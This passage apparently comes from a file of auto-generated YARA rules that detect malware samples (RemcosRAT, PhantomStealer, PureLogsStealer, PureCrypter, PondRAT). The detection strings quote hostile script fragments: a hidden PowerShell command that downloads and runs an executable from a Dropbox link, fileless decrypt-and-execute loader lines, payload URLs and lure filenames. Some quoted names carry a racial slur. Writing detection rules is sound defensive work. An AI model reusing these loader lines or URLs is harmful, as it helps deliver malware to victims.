      $s6 = "KrrX5X2zumRZTy3QvyPqIQOqdONL7l77fwIxWncc6uWTvS5XbNVxRrro162jYIvY7tPpVmutExtarqK/ksUMlnWdiS3NWuY/5vD51x/EbVlPTi4ENGdA0z+XscXJtYaf" ascii /* score: '22.00'*/
      $s7 = "oB6wRuIARL2+WS/6Xf9gziQCodT7hsFZfb+bKDzuQoaciC1oOL/cN5yka84qiIc7S8IvLv0Z4tbMdBNM2DumPW3ENV7wcN/BiA8kgzye2InhZR4uTVPWt3Y9WzEMpFC0" ascii /* score: '21.00'*/
      $s8 = "Rdv/ysQx4MtWsliJ0nr4o341mDLlZZEGyf7BvTq8xQO16NJUDEq4XjTjRh6hugd85lu9DdOmarkLuK+6KlOGv5riU8JzgAw9NN8yPALjthuI4Oi9/rRCkO4BCxArDK3x" ascii /* score: '21.00'*/
      $s9 = "+qJLNIhkW7b9+jDjUFC5+cDMt9U8WZSYOVHDnf8Us9klkYspyzlUQl7vLq6hoPXPnzoxk8FtxPkmrNF25zvZZL2/W0qYIArr989vxrwZ1boexMdlL+MDJmrDcqi4jFTR" ascii /* score: '21.00'*/
      $s10 = "3eEJaOIwl8AWfOkv7bdG7lirbB/4Yxq2AdeD5pJATNVcH7RIgaPmD089DGSHHyCn3wM1vUU+m0H1zefEePutgIr/eYERgovlogoLKVZed+QbQl4AEjKRdIow72/viIGB" ascii /* score: '21.00'*/
      $s11 = "4/JlGYyD8yc3nJLe6Y4EsjtY0071isRiHL77OcW4g9M6US8x1A4FiSQ4tU8iYdAbYptZji5+8lGH3WNInCOsSHeYEAEWyxvcDpDaJ/gCb6ytJU8Ftpd4RF9ty5Fzt6S5" ascii /* score: '21.00'*/
      $s12 = "PyfgDUmPGcRRHYWdvGiQ9L2otTn5A18rGrFZSkXURP/O1eVOKR3lWM2maQDR6M/7IxTdmVRCx+w6bapeF0gpEfvdlq92tQ2xeD1Ly9LExfYBu8upiFa45SYJIWaUpE44" ascii /* score: '21.00'*/
      $s13 = "hFcUP0NM4Lc4a26L2LPAgu25g5vnKZnKy/IByvOGBDzwUqwnFCDUMp7buEZdlFYasYkE6xKW7IRRPCnhy6Is2JFcILQVIw3H7t+fXAn4+rF8npxPMOqi6vb0OVZNx1M/" ascii /* score: '21.00'*/
      $s14 = "AUeR70q5iWMS9OmUTt6R6o20ykc+t9IURRN3Ms96W4SdJpeYEUOhUFXcwFNt8P2P/j8F+ra1MMTgSCgCzvSHId8sIJWONldF9H96c+iywgUr3Cxp4gWUHFt9cvJnsMME" ascii /* score: '20.00'*/
      $s15 = "q7rAyqNmMfovMfCiKnkdUx5BtbPg13EGum9kZUYp5Emx2HXI3O/aC3McXCD5mqqQA37TX0EXecVPIPiToqvvwA39SBfIl2bZ3gWkaAgoWaLw85A27bokPFx3TKcutFQV" ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 4000KB and
      1 of ($x*) and 4 of them
}

rule RemcosRAT_signature__5 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature).ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "203e23dcaed7dbea1bbcd1e4db1e9db14590d50216f9d78263485a3fbe6558b8"
   strings:
      $x1 = "        $assemblyBytes = [System.Convert]::FromBase64String('TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* score: '37.00'*/
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ' */ /* score: '26.50'*/
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */ /* score: '26.50'*/
      $s4 = "jOGNmN2JkY2JkNjI4MzQ2ZQBtX2JiODc4MjUzMmFkZjQzODliY2NlOGU4ZWUzZmM5MDU4AG1fNTU4YzBjYTgxM2I3NGY2NGFkNWRmNjMxNTI5MjdiZGMAdUk3SklnNUd" ascii /* base64 encoded string '8cf7bdcbd628346e m_bb8782532adf4389bcce8e8ee3fc9058 m_558c0ca813b74f64ad5df63152927bdc uI7JIg5G' */ /* score: '26.00'*/
      $s5 = "3YTIzMWEyOTk5AG1fYmZlOGZjN2M2YWNjNDNlNjg3MTEwNWU5MDVhMDdkNzIAbV9iZGYyMWM3YmI1NGI0NzMyODExN2M2NmRmYmU3Y2QzMABtXzVlMjAyYTc5YzYzMjQ" ascii /* base64 encoded string 'a231a2999 m_bfe8fc7c6acc43e6871105e905a07d72 m_bdf21c7bb54b47328117c66dfbe7cd30 m_5e202a79c6324' */ /* score: '26.00'*/
      $s6 = "lMzQ4MWNhOGNhMmM4Njk1NWUxMTE2AG1fNGMzZmYzNGQzZGNlNGQ5N2I3NmI1M2Y2MDZmYjU1ZjMAbV9hNmIwODE2ZGQ4MDM0ZDk0ODA5NTZmMDg5NTllOGJiMgBtXzU" ascii /* base64 encoded string '3481ca8ca2c86955e1116 m_4c3ff34d3dce4d97b76b53f606fb55f3 m_a6b0816dd8034d9480956f08959e8bb2 m_5' */ /* score: '26.00'*/
      $s7 = "# Execute the script directly" fullword ascii /* score: '25.00'*/
      $s8 = "504150414444494E47585850414444494E4750414444494E47585850414444494E4750414444494E47585850414444494E4750414444494E4758585041444449" ascii /* score: '24.00'*/ /* hex encoded string 'PAPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADD' */
      $s9 = "4C4943204B45592D2D2D2D2D00002D2D2D2D2D454E44205055424C4943204B45592D2D2D2D2D00000000303132333435363738394142434445464748494A4B4C" ascii /* score: '24.00'*/ /* hex encoded string 'LIC KEY----------END PUBLIC KEY-----0123456789ABCDEFGHIJKL' */
      $s10 = "0000740065002D0049004E0000006B006E002D0049004E0000006D006C002D0049004E0000006D0072002D0049004E000000730061002D0049004E0000006D00" ascii /* score: '24.00'*/ /* hex encoded string 'te-INkn-INml-INmr-INsa-INm' */
      $s11 = "2D00670075006100740065006D0061006C00610000007300700061006E006900730068002D0068006F006E006400750072006100730000000000730070006100" ascii /* score: '24.00'*/ /* hex encoded string '-guatemalaspanish-hondurasspa' */
      $s12 = "7074656D6265720000004F63746F626572004E6F76656D62657200000000446563656D62657200000000414D0000504D00004D4D2F64642F7979000000006464" ascii /* score: '24.00'*/ /* hex encoded string 'ptemberOctoberNovemberDecemberAMPMMM/dd/yydd' */
      $s13 = "60766563746F7220766261736520636F6E7374727563746F72206974657261746F722700607669727475616C20646973706C6163656D656E74206D617027" ascii /* score: '24.00'*/ /* hex encoded string '`vector vbase constructor iterator'`virtual displacement map'' */
      $s14 = "00002E00000000000000000020002000200020002000200020002000200028002800280028002800200020002000200020002000200020002000200020002000" ascii /* score: '24.00'*/ /* hex encoded string '.         (((((            ' */
      $s15 = "69007A0065000000000065006E0067006C006900730068002D00630061006E00000065006E0067006C006900730068002D006300610072006900620062006500" ascii /* score: '24.00'*/ /* hex encoded string 'izeenglish-canenglish-caribbe' */
   condition:
      uint16(0) == 0x0a0d and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule PhantomStealer_signature__3 {
   meta:
      description = "_subset_batch - file PhantomStealer(signature).rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d99a371eb7a05c0e0a2a1b6259a67d8a66c7ccb174e66fae727506b5e089911c"
   strings:
      $s1 = "PO NO 151001896902.exe" fullword ascii /* score: '16.00'*/
      $s2 = "e - )]" fullword ascii /* score: '9.00'*/
      $s3 = "PO NO 151001896902.txt" fullword ascii /* score: '8.00'*/
      $s4 = "kvvcfqz" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 3000KB and
      all of them
}

rule PhantomStealer_signature__3150251b {
   meta:
      description = "_subset_batch - file PhantomStealer(signature)_3150251b.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3150251b3435f22ec0e3b725ad540cf2929bcfa2ea16d29ab6a2acdb871855fb"
   strings:
      $s1 = "PO NO 151001896902.exe" fullword ascii /* score: '16.00'*/
      $s2 = "e - )]" fullword ascii /* score: '9.00'*/
      $s3 = "PO NO 151001896902.txt" fullword ascii /* score: '8.00'*/
      $s4 = "kvvcfqz" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 3000KB and
      all of them
}

rule PhantomStealer_signature__4 {
   meta:
      description = "_subset_batch - file PhantomStealer(signature).vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "35c10882732b9631c2b411e22e7796a0feb9abcb820f654daae43f3091b403d2"
   strings:
      $x1 = "    Set shell = wsh.Exec(\"powershell -windowstyle hidden -noprofile -noninteractive -command \"\"\" & psCommand & \"\"\"\")" fullword ascii /* score: '36.00'*/
      $s2 = "    ' Execute PowerShell command with hidden window" fullword ascii /* score: '25.00'*/
      $s3 = "    psCommand = \"$encryptedBytes = [System.Convert]::FromBase64String('\" & base64EncryptedScript & \"');\" & _" fullword ascii /* score: '22.00'*/
      $s4 = "' Fileless AES Decryption and Execution Script" fullword ascii /* score: '21.00'*/
      $s5 = "Function DecryptAES(base64EncryptedScript, base64Key, base64IV)" fullword ascii /* score: '20.00'*/
      $s6 = "' Execute the decrypted code directly from memory" fullword ascii /* score: '18.00'*/
      $s7 = "ExecuteGlobal decryptedCode" fullword ascii /* score: '18.00'*/
      $s8 = "    Dim psCommand, decrypted, wsh, shell" fullword ascii /* score: '15.00'*/
      $s9 = "    ' Create PowerShell command for decryption" fullword ascii /* score: '12.00'*/
      $s10 = "' Decrypt the VBScript code in memory" fullword ascii /* score: '12.00'*/
      $s11 = "        If shell.ExitCode <> 0 Then errorMsg = errorMsg & \" Exit Code: \" & shell.ExitCode" fullword ascii /* score: '12.00'*/
      $s12 = "                \"$decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length);\" & _" fullword ascii /* score: '11.00'*/
      $s13 = "yrZn883bOPGHYqclJq6yG48tAQ87nWi2iL1npUoH/YK58ZQEsnyLUOrMejzm/TZr47TeeEDcc+eObKymiWa/RIrsHGXlqeZgS/w/bV14pLmpDJZEDeU6CJLm9+MsaOHc" ascii /* score: '11.00'*/
      $s14 = "6pyEQ4XbppUX9pnWQcglO+XBGCvINAmyEPvn3bN0I0DKguIWTzqs57jPBJMy2XdPtU7FELtN7Vy8ruApwn3PCOlKfs/Z09eJTcjzCvM5sjOEP8Jzzd3BpcH7AjeHrhih" ascii /* score: '11.00'*/
      $s15 = "                \"$key = [System.Convert]::FromBase64String('\" & base64Key & \"');\" & _" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x704f and filesize < 9KB and
      1 of ($x*) and 4 of them
}

rule RMS_signature_ {
   meta:
      description = "_subset_batch - file RMS(signature).vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7ac5d45e6ca362d6890acc7236f3c842e2d1cb07aa1613066879eb7ca5260149"
   strings:
      $x1 = "filePath = \"C:\\Users\\Public\\Agent.RUT.7.6.2.0.exe.com\"" fullword ascii /* score: '44.00'*/
      $x2 = "    downloadCommand = \"powershell -WindowStyle Hidden -Command \"\"Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/trwfa" ascii /* score: '34.00'*/
      $x3 = "k6scxu6bawx3m/Agent.RUT.7.6.2.0.exe.com?rlkey=kezjmassbkksfipnlxwj0hy9i&st=yfl40qxb&dl=1' -OutFile '\" & filePath & \"'\"\"\"" fullword ascii /* score: '31.00'*/
      $s4 = "    downloadCommand = \"powershell -WindowStyle Hidden -Command \"\"Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/trwfa" ascii /* score: '26.00'*/
      $s5 = "Dim WshShell, fso, downloadCommand, filePath" fullword ascii /* score: '21.00'*/
      $s6 = "    WshShell.Run downloadCommand, 0, True ' 0 = oculto, True = espera a que termine" fullword ascii /* score: '19.00'*/
      $s7 = "WshShell.Run \"\"\"\" & filePath & \"\"\"\", 1, False ' 1 = ventana normal, False = no espera a que termine" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x704f and filesize < 2KB and
      1 of ($x*) and all of them
}

rule PureLogsStealer_signature__5 {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature).tar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "38566cba11b065a9ad7bfaee4b346088162fada2c4efb8140bd30b3d744eb709"
   strings:
      $s1 = "Set quickset = niggerism.Get(\"Win32_ProcessStartup\").SpawnInstance_" fullword ascii /* score: '26.00'*/
      $s2 = "spaded = glacier.GetParentFolderName(WScript.ScriptFullName)" fullword ascii /* score: '19.00'*/
      $s3 = "Set diamagnetically = niggerism.Get(\"Win32_Process\")" fullword ascii /* score: '19.00'*/
      $s4 = "rshell -N" fullword ascii /* score: '13.00'*/
      $s5 = "Set niggerism = GetObject(\"winmgmts:root\\cimv2\")" fullword ascii /* score: '12.00'*/
      $s6 = "Bonifico%20n.110125194004.vbs" fullword ascii /* score: '11.00'*/
      $s7 = "Set glacier = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x6f42 and filesize < 100KB and
      all of them
}

rule PureLogsStealer_signature__6 {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature).vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "906af8fba6dc132956394423c6cbcc9c7cfb7f0f10a8e289943d70072d8c9e0b"
   strings:
      $s1 = "Set quickset = niggerism.Get(\"Win32_ProcessStartup\").SpawnInstance_" fullword ascii /* score: '26.00'*/
      $s2 = "spaded = glacier.GetParentFolderName(WScript.ScriptFullName)" fullword ascii /* score: '19.00'*/
      $s3 = "Set diamagnetically = niggerism.Get(\"Win32_Process\")" fullword ascii /* score: '19.00'*/
      $s4 = "rshell -N" fullword ascii /* score: '13.00'*/
      $s5 = "Set niggerism = GetObject(\"winmgmts:root\\cimv2\")" fullword ascii /* score: '12.00'*/
      $s6 = "Set glacier = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x6553 and filesize < 100KB and
      all of them
}

rule RemcosRAT_signature__ce2277ec {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_ce2277ec.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ce2277eccd4bb7a8adad10e3cfb7b534bda20e67aa7175526dc04c2332373a12"
   strings:
      $s1 = "Set unentering = unexcelled.Get(\"Win32_ProcessStartup\").SpawnInstance_" fullword ascii /* score: '26.00'*/
      $s2 = "Set nitrojute = unexcelled.Get(\"Win32_Process\")" fullword ascii /* score: '23.00'*/
      $s3 = "noninsurance = burlaps.GetParentFolderName(WScript.ScriptFullName)" fullword ascii /* score: '19.00'*/
      $s4 = "rshell -N" fullword ascii /* score: '13.00'*/
      $s5 = "Set unexcelled = GetObject(\"winmgmts:root\\cimv2\")" fullword ascii /* score: '12.00'*/
      $s6 = "commorient = discontentions(commorient, \"" fullword ascii /* score: '12.00'*/
      $s7 = "Set burlaps = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii /* score: '10.00'*/
      $s8 = "uveous = discontentions(uveous, \"" fullword ascii /* score: '9.00'*/
      $s9 = "Function discontentions(phototropism, coprophages, wondered)" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x6553 and filesize < 100KB and
      all of them
}

rule RemcosRAT_signature__ead16f58 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_ead16f58.vbe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ead16f58c4942a6fdd307e8a159853c329f56df1185ca04e05f8195755cec829"
   strings:
      $s1 = "Execute decryptedContent" fullword ascii /* score: '23.00'*/
      $s2 = "Dim xmlObject, encryptedBytes, decryptedContent" fullword ascii /* score: '16.00'*/
      $s3 = "decryptedContent = CustomRC4(encryptedBytes, \"WW%UEp=,6Tan[)X=\")" fullword ascii /* score: '16.00'*/
      $s4 = "xmlObject.dataType = \"bin.base64\"" fullword ascii /* score: '14.00'*/
      $s5 = "waitTime = Int((3000 - 500 + 1) * Rnd + 500)" fullword ascii /* score: '12.00'*/
      $s6 = "If Timer > 0 Then Dim tempVar : tempVar = \"Nothing\" : End If" fullword ascii /* score: '11.00'*/
      $s7 = "  Dim cleanedString, tempString" fullword ascii /* score: '11.00'*/
      $s8 = "xmlObject.text = combinedBase64" fullword ascii /* score: '10.00'*/
      $s9 = "encryptedBytes = xmlObject.nodeTypedValue" fullword ascii /* score: '9.00'*/
      $s10 = "Dim obfVarA : obfVarA = 99 + Rnd() * 100" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 100KB and
      all of them
}

rule PhantomStealer_signature__5 {
   meta:
      description = "_subset_batch - file PhantomStealer(signature).zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f93ac1a526998ef84868a15c12a2e4826226f18b971cb6382cf2cd32a8aa7ef2"
   strings:
      $s1 = "/RFQ-Supply & Delivery EN 10204_2021 English.exe" fullword ascii /* score: '22.00'*/
      $s2 = "/RFQ-Supply & Delivery EN 10204_2021 English.png" fullword ascii /* score: '10.00'*/
      $s3 = "RFQ-Supply & Delivery EN 10204_2021 English.rar" fullword ascii /* score: '10.00'*/
      $s4 = "\\4&(*\"f" fullword ascii /* score: '10.00'*/ /* hex encoded string 'O' */
      $s5 = "* TO0N-z" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 4000KB and
      all of them
}

rule RustyStealer_signature__3263ac4f179f7e24186699b3245eba91_imphash_ {
   meta:
      description = "_subset_batch - file RustyStealer(signature)_3263ac4f179f7e24186699b3245eba91(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "66c3ffa85ebe1d52aed7606ce14c717cad54b26fe95b93d1f9c681d4640d0831"
   strings:
      $s1 = ";http://crt.sectigo.com/SectigoPublicTimeStampingRootR46.p7c0#" fullword ascii /* score: '23.00'*/
      $s2 = ";http://crl.sectigo.com/SectigoPublicTimeStampingRootR46.crl0|" fullword ascii /* score: '19.00'*/
      $s3 = "https://sectigo.com/CPS0" fullword ascii /* score: '17.00'*/
      $s4 = "9http://crl.sectigo.com/SectigoPublicTimeStampingCAR36.crl0z" fullword ascii /* score: '16.00'*/
      $s5 = "9http://crt.sectigo.com/SectigoPublicTimeStampingCAR36.crt0#" fullword ascii /* score: '16.00'*/
      $s6 = "?http://crl.usertrust.com/USERTrustRSACertificationAuthority.crl05" fullword ascii /* score: '16.00'*/
      $s7 = "http://ocsp.sectigo.com0" fullword ascii /* score: '14.00'*/
      $s8 = "%Sectigo Public Time Stamping Root R46" fullword ascii /* score: '13.00'*/
      $s9 = "%Sectigo Public Time Stamping Root R460" fullword ascii /* score: '13.00'*/
      $s10 = "'Sectigo Public Time Stamping Signer R360" fullword ascii /* score: '10.00'*/
      $s11 = "'Sectigo Public Time Stamping Signer R36" fullword ascii /* score: '10.00'*/
      $s12 = "B.%c:\"RW" fullword ascii /* score: '9.50'*/
      $s13 = "lllllllo" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      8 of them
}

rule RustyStealer_signature__28f0a0cfb357fe553e933bf84f98aca7_imphash_ {
   meta:
      description = "_subset_batch - file RustyStealer(signature)_28f0a0cfb357fe553e933bf84f98aca7(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "51f10ba0c6bdf7f47db635fb0c74be0ab9d9c41e552a7bf085419fe312423c1d"
   strings:
      $x1 = "bcryptprimitives.dll" fullword ascii /* reversed goodware string 'lld.sevitimirptpyrcb' */ /* score: '33.00'*/
      $s2 = "        <requestedExecutionLevel level=\"asInvoker\"/>" fullword ascii /* score: '15.00'*/
      $s3 = "www.microsoft.com0" fullword ascii /* score: '14.00'*/
      $s4 = "#%%%%%%%" fullword ascii /* reversed goodware string '%%%%%%%#' */ /* score: '11.00'*/
      $s5 = "%w:\\-E0" fullword ascii /* score: '9.50'*/
      $s6 = "DYdlOgt" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      1 of ($x*) and all of them
}

rule PhantomStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__67de6fb5 {
   meta:
      description = "_subset_batch - file PhantomStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_67de6fb5.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "67de6fb5afc5af13a1c7d7eec47738efbea3366de56263d56f929f9a195ce082"
   strings:
      $s1 = "Putqq.exe" fullword wide /* score: '22.00'*/
      $s2 = "GenerateRemoteToken" fullword ascii /* score: '10.00'*/
      $s3 = "Clftimveqq.Tokens" fullword ascii /* score: '10.00'*/
      $s4 = "ReceiveOperationalClient" fullword ascii /* score: '9.00'*/
      $s5 = "&(\\/22`_" fullword ascii /* score: '9.00'*/ /* hex encoded string '"' */
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule PhantomStealer_signature__fce76c16 {
   meta:
      description = "_subset_batch - file PhantomStealer(signature)_fce76c16.rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fce76c1633b57695febf2c9f495e13cd719fcd5663bb18b3d5254350a808aada"
   strings:
      $s1 = "New Purchase Order 28142.exe" fullword ascii /* score: '19.00'*/
      $s2 = "VFR9cyk55" fullword ascii /* base64 encoded string 'TT}s)9' */ /* score: '11.00'*/
      $s3 = "253]\\257" fullword ascii /* score: '9.00'*/ /* hex encoded string '%2W' */
      $s4 = "4AiBy+ @fg" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 5000KB and
      all of them
}

rule PhantomStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__d1bc4e42 {
   meta:
      description = "_subset_batch - file PhantomStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d1bc4e42.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d1bc4e42ecce35e89268c590d57779b243c1c9726468aebe52f286c309d26d5d"
   strings:
      $s1 = "Ehvwvm.exe" fullword wide /* score: '22.00'*/
      $s2 = "* <.SX" fullword ascii /* score: '9.00'*/
      $s3 = "EncryptInitializer" fullword ascii /* score: '9.00'*/
      $s4 = "get_Sbmnzynura" fullword ascii /* score: '9.00'*/
      $s5 = "InvokeInitializer" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule PureLogsStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__4131b2df {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4131b2df.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4131b2dfd412e57a127e23c333d39d3f1dbf4e0aa07db5d06329e70abd8d022e"
   strings:
      $s1 = "Rwwhqmgplx.exe" fullword wide /* score: '22.00'*/
      $s2 = "get_MaxDecompressedBytes" fullword ascii /* score: '12.00'*/
      $s3 = "get_Decrypted" fullword ascii /* score: '11.00'*/
      $s4 = "m_MonitorTemplateItems" fullword ascii /* score: '11.00'*/
      $s5 = "_TokenizerRecommender" fullword ascii /* score: '10.00'*/
      $s6 = "get_HeaderSizeBytes" fullword ascii /* score: '9.00'*/
      $s7 = "Decompressed" fullword ascii /* score: '9.00'*/
      $s8 = "set_HeaderSizeBytes" fullword ascii /* score: '9.00'*/
      $s9 = "EncryptSorter" fullword ascii /* score: '9.00'*/
      $s10 = "get_Oaythzzo" fullword ascii /* score: '9.00'*/
      $s11 = "InvokeRequested" fullword ascii /* score: '8.00'*/
      $s12 = "add_InvokeRequested" fullword ascii /* score: '8.00'*/
      $s13 = "remove_InvokeRequested" fullword ascii /* score: '8.00'*/
      $s14 = "InvokeObserver" fullword ascii /* score: '8.00'*/
      $s15 = "sizespec" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule PondRAT_signature_ {
   meta:
      description = "_subset_batch - file PondRAT(signature).macho"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f0321c93c93fa162855f8ea4356628eef7f528449204f42fbfa002955a0ba528"
   strings:
      $s1 = "__mh_execute_header" fullword ascii /* score: '19.00'*/
      $s2 = "<key>com.apple.security.get-task-allow</key>" fullword ascii /* score: '18.00'*/
      $s3 = "__Z14DecryptPayloadPhjS_Pj" fullword ascii /* score: '15.00'*/
      $s4 = "objc_firstloader-55554944179bf215ae8d38c9aeb580decc4f6e2d" fullword ascii /* score: '15.00'*/
      $s5 = "!com.apple.security.get-task-allow" fullword ascii /* score: '15.00'*/
      $s6 = "/System/Library/CoreServices/SystemVersion.plist" fullword ascii /* score: '13.00'*/
      $s7 = "__Z11SendPayloadPhj" fullword ascii /* score: '13.00'*/
      $s8 = "/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation" fullword ascii /* score: '13.00'*/
      $s9 = "__Z11RecvPayloadPhPj" fullword ascii /* score: '13.00'*/
      $s10 = "__Z12CryptPayloadPhjS_Pj" fullword ascii /* score: '13.00'*/
      $s11 = "/System/Library/Frameworks/Foundation.framework/Versions/C/Foundation" fullword ascii /* score: '13.00'*/
      $s12 = "setValue:forHTTPHeaderField:" fullword ascii /* score: '12.00'*/
      $s13 = "@_CFBundleGetVersionNumber" fullword ascii /* score: '12.00'*/
      $s14 = "_objc_msgSend$addValue:forHTTPHeaderField:" fullword ascii /* score: '12.00'*/
      $s15 = "_objc_msgSend$setValue:forHTTPHeaderField:" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0xfeca and filesize < 500KB and
      8 of them
}

rule PureCrypter_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file PureCrypter(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1dc84047abcbe1bc903de805450587c1d79b96c696caa8ea5512eeff54e2c2d0"
   strings:
      $s1 = "https://stacysublett.com/wp-content/plugins/Ucoacbc.pdf" fullword wide /* score: '22.00'*/
      $s2 = "INV064-FJTH1000356-RFQ2025.exe" fullword wide /* score: '19.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 80KB and
      all of them
}

rule PureCrypter_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__ae05c7d7 {
   meta:
      description = "_subset_batch - file PureCrypter(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ae05c7d7.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ae05c7d70a5afa168435f9111cb79cdd6bfb1e17979b44de1540ccfd932a5b32"
   strings:
      $s1 = "Invoice.exe" fullword wide /* score: '22.00'*/
      $s2 = "<InvokeTargetMethod>b__0" fullword ascii /* score: '18.00'*/
      $s3 = "InvokeTargetMethod" fullword ascii /* score: '18.00'*/
      $s4 = "CryptographicProcessor" fullword ascii /* score: '15.00'*/
      $s5 = "https://tami.hk/wp-content/Rwdxnjfnfkt.wav" fullword wide /* score: '15.00'*/
      $s6 = "AssemblyExecutionEngine" fullword ascii /* score: '12.00'*/
      $s7 = "TransformEncryptedData" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 40KB and
      all of them
}

rule PureLogsStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__393cc5b6 {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_393cc5b6.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "393cc5b6121ddef37d825fd71ea0836d7249c745156914c323d785b2fc7998ee"
   strings:
      $s1 = "Akmosexjeca.exe" fullword wide /* score: '18.00'*/
      $s2 = "get_MaxDecompressedBytes" fullword ascii /* score: '12.00'*/
      $s3 = "get_Decrypted" fullword ascii /* score: '11.00'*/
      $s4 = "m_DecryptorMonitors" fullword ascii /* score: '11.00'*/
      $s5 = "get_HeaderSizeBytes" fullword ascii /* score: '9.00'*/
      $s6 = "Decompressed" fullword ascii /* score: '9.00'*/
      $s7 = "set_HeaderSizeBytes" fullword ascii /* score: '9.00'*/
      $s8 = "EmitOperationalEmitter" fullword ascii /* score: '9.00'*/
      $s9 = "get_Nofojlltaao" fullword ascii /* score: '9.00'*/
      $s10 = "Jhtffbjxkey" fullword ascii /* score: '9.00'*/
      $s11 = "m_OperationalSpecMsg" fullword ascii /* score: '9.00'*/
      $s12 = "InvokeRequested" fullword ascii /* score: '8.00'*/
